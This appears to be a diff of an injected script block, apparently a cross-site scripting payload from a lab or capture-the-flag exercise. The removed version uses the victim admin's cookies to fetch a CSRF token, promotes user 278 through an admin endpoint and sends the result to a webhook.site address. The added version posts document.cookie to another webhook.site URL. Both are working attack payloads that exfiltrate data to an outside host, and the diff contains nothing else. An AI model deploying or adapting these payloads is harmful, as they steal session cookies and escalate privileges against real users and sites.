@@ -1,31 +1,7 @@
 <script>
-(async () => {
-  try {
-    // build base URL without credentials
-    const base = ''
-
-    // fetch CSRF token using admin's cookies
-    const tokRes = await fetch(base + '/csrf-token', { credentials: 'include' });
-    const tokJson = await tokRes.json();
-    // read csrfToken first, then fall back to common names
-    const csrf = tokJson.csrfToken || tokJson.csrf || tokJson.token || tokJson._csrf || tokJson.CSRF;
-
-    // POST to promote userId 278
-    const promoteRes = await fetch(base + '/admin/addAdmin', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {
-        'Content-Type': 'application/json',
-        'CSRF-Token': csrf
-      },
-      body: JSON.stringify({ userId: 278 })
-    });
-
-    const promoteText = await promoteRes.text();
-    // exfiltrate the response to your webhook
-    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?res=' + encodeURIComponent(promoteText);
-  } catch (e) {
-    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(e.message);
-  }
-})();
+fetch('https://webhook.site/47f37b5b-2d0e-4878-851b-7e23ed4d1953', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
 </script>
